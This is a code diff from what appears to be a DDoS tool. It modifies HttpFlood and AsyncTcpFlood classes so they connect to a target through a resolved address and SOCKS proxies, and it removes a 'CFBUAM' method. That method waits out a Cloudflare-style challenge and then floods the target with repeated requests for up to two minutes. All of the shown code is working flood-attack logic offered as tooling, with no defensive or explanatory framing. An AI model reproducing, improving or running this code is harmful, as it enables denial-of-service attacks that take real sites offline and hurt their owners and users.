@@ -394,7 +394,7 @@ class HttpFlood:
     def __init__(
         self,
         target: URL,
-        host: str,
+        addr: str,
         method: str,
         rpc: int,
         event: Event,
@@ -408,12 +408,12 @@ class HttpFlood:
         self._rpc = rpc
         self._method = method
         self._target = target
-        self._host = host
-        self._raw_target = (self._host, (self._target.port or 80))
+        self._addr = addr
+        self._raw_target = (self._addr, (self._target.port or 80))
         self._stats = stats
 
         if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (self._host, (self._target.port or 80))
+            self._raw_target = (self._addr, (self._target.port or 80))
 
         self._referers = referers
         self._useragents = useragents
@@ -526,22 +526,6 @@ class HttpFlood:
                     self._stats.track(1, Tools.sizeOfRequest(res))
                     packets += 1
         Tools.safe_close(s)
-
-    def CFBUAM(self) -> int:
-        payload: bytes = self.generate_payload()
-        s, packets = None, 0
-        with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, payload, self._stats)
-            packets += 1
-            sleep(5.01)
-            ts = time()
-            for _ in range(self._rpc):
-                if not self._event.is_set(): return 0
-                Tools.send(s, payload, self._stats)
-                packets += 1
-                if time() > ts + 120: break
-        Tools.safe_close(s)
-        return packets
 
     def DGB(self) -> int:
         proxies = self._get_proxy().asRequest()
@@ -676,7 +660,7 @@ class AsyncTcpFlood(HttpFlood):
         if proxy_url:
             conn = aiohttp_socks.open_connection(
                 proxy_url=proxy_url,
-                host=self._target.host,
+                host=self._addr,
                 port=self._target.port,
                 ssl=ssl_ctx,
                 server_hostname=server_hostname,
